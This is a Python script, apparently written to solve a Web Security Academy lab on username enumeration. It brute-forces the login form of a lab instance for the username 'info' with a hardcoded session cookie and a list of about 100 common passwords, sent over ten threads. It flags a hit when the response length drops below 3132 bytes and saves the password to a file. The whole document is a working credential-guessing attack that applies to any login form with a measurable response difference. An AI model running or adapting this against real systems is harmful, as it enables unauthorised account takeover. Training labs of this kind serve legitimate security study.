from requests import post
from concurrent.futures import ThreadPoolExecutor

# Coloque a URL do lab aqui
baseurl = "https://0a3300d70408767d82a0568c00b700f9.web-security-academy.net"
url = f"{baseurl}/login"

# Coloque o username descoberto aqui
username = "info"

headers = {
    "Cookie": "session=Y3vl11wP8BDBm5lwPpMkinVCd4hJrDAm",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": baseurl,
    "Referer": url,
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Priority": "u=0, i",
    "Te": "trailers",
    "Connection": "keep-alive"
}

password_list = [
'123456',
'password',
'12345678',
'qwerty',
'123456789',
'12345',
'1234',
'111111',
'1234567',
'dragon',
'123123',
'baseball',
'abc123',
'football',
'monkey',
'letmein',
'shadow',
'master',
'666666',
'qwertyuiop',
'123321',
'mustang',
'1234567890',
'michael',
'654321',
'superman',
'1qaz2wsx',
'7777777',
'121212',
'000000',
'qazwsx',
'123qwe',
'killer',
'trustno1',
'jordan',
'jennifer',
'zxcvbnm',
'asdfgh',
'hunter',
'buster',
'soccer',
'harley',
'batman',
'andrew',
'tigger',
'sunshine',
'iloveyou',
'2000',
'charlie',
'robert',
'thomas',
'hockey',
'ranger',
'daniel',
'starwars',
'klaster',
'112233',
'george',
'computer',
'michelle',
'jessica',
'pepper',
'1111',
'zxcvbn',
'555555',
'11111111',
'131313',
'freedom',
'777777',
'pass',
'maggie',
'159753',
'aaaaaa',
'ginger',
'princess',
'joshua',
'cheese',
'amanda',
'summer',
'love',
'ashley',
'nicole',
'chelsea',
'biteme',
'matthew',
'access',
'yankees',
'987654321',
'dallas',
'austin',
'thunder',
'taylor',
'matrix',
'mobilemail',
'mom',
'monitor',
'monitoring',
'montana',
'moon',
'moscow',
]


def send_request_password(password):
    data = {
        "username": username,
        "password": password
    }
    response = post(url, headers=headers, data=data)
    if len(response.content) < 3132:
        print(f"\033[92mPassword found: {password} len: {len(response.content)}\033[0m")
        with open('UsernameEnumerationPassword.txt', 'w') as f:
                f.write(f'{password}\n')
        return password
    print(f"Trying password: {password}, len: {len(response.content)}")

with ThreadPoolExecutor(max_workers=10) as executor:
    futures = [executor.submit(send_request_password, password) for password in password_list]
    for future in futures:
        future.result()
